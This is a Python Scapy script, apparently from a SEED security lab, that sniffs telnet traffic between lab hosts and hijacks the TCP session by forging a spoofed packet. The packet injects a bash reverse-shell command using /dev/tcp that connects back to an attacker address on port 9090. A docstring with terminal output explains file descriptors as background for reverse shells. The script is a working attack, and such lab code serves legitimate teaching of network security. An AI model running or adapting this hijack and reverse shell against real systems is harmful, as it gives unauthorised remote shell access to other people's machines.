#!/usr/bin/env python3
from scapy.all import *

""" About file descriptors to explain Reverse Shell
<-- in 1 terminal --> 
seed@10.0.2.6:$ echo $$
11345
seed@10.0.2.6:$ cat
sdfsdfdf
sdfsdfdf
hello

<-- in 2 terminal --> 
seed@10.0.2.6:$ echo hello > /dev/pts/17

<-- in 3 terminal --> 
seed@10.0.2.6:$ pstree -p 11345
bash (11345)-cat (11674)
seed@10.0.2.6:$ ls -l /proc/11674/fd
total 0
lrwx------1 seed seed 64 Feb 23 23:18 0 -> /dev/pts/17
lrwx------1 seed seed 64 Feb 23 23:18 1 -> /dev/pts/17
lrwx------1 seed seed 64 Feb 23 23:18 2 -> /dev/pts/17
"""


def hijack(pkt):
    VICTIM = "10.9.0.5"
    HOST_WITH_TELNET_CLIENT = "10.9.0.6"
    ATTACKER = "10.9.0.1"
    
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    
    newseq = old_tcp.seq + 10
    newack = old_tcp.ack + 1
    ip = IP(src=HOST_WITH_TELNET_CLIENT, dst=VICTIM)
    tcp = TCP(
        sport=old_tcp.sport, 
        dport=23, 
        flags="A", 
        seq=newseq, 
        ack=newack
    )
    
    # Make a Reverse Shell on victim to attacker (expected 'nc' on 9090)
    data = f"\n/bin/bash -i >/dev/tcp/{ATTACKER}/9090 0<&1 2>&1\n"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose=0)
    quit()


myFilter = 'tcp and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23'

sniff(filter=myFilter, prn=hijack, store=0, iface="br-4b40c97b1673", promisc=True)

